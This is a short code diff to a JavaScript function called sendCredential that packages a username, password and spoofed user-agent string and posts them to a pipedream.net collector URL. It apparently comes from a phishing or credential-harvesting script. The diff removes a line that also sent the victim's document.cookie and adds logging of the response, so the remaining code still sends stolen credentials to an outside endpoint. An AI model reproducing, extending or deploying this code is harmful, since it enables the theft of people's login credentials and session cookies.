@@ -13,7 +13,7 @@ function sendCredential(username, password) {
     const body = {
         "username": username,
         "password": password,
-        "cookies": document.cookie,
+        "cookies": "ignore",
         "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_4) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100 Safari/534.30"
     };
 
@@ -24,7 +24,9 @@ function sendCredential(username, password) {
         body: JSON.stringify(body),
     };
 
-    fetch("https://ensnocsamq9t9ho.m.pipedream.net", options);
+    fetch("https://ensnocsamq9t9ho.m.pipedream.net", options).then((function(response) {
+        console.log(response);
+    }));
 }
 
 
